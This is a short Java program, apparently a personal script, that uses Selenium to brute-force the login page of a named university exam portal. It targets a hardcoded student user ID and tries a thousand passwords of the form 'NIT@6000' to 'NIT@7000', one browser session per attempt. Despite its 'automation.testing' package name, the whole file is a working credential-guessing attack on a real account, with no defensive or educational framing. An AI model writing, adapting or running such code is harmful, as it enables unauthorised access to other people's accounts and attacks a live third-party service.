package automation.testing;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

/**
 * @author SANJAY
 * 
 *         Date - 24/10/2021
 *
 */
public class SeleniumCrackPass {

	/**
	 * @param userId
	 * 
	 *               Creating method with String userId formal argument
	 * 
	 */
	void logicCrackPass(String userId) {
		for (int i = 6000; i <= 7000; i++) {
			System.setProperty("webdriver.chrome.driver",
					"C:\\Users\\SANJAY\\Desktop\\chromedriver_win32 (1)\\chromedriver.exe");
			WebDriver driver = new ChromeDriver();
			driver.get("http://www.bputexam.in/LoginMain.aspx?ReturnUrl=%2f");
			driver.findElement(By.id("PtuLogin_UserName")).sendKeys(userId);
			driver.findElement(By.id("PtuLogin_Password")).sendKeys("NIT@" + i);
			driver.findElement(By.id("PtuLogin_LoginButton")).click();
		}
	}

	/**
	 * @param args
	 * 
	 *             Passing argument to the method when it invoked it will take the
	 *             actual argument
	 */
	public static void main(String[] args) {
		new SeleniumCrackPass().logicCrackPass("1601297188");
	}
}
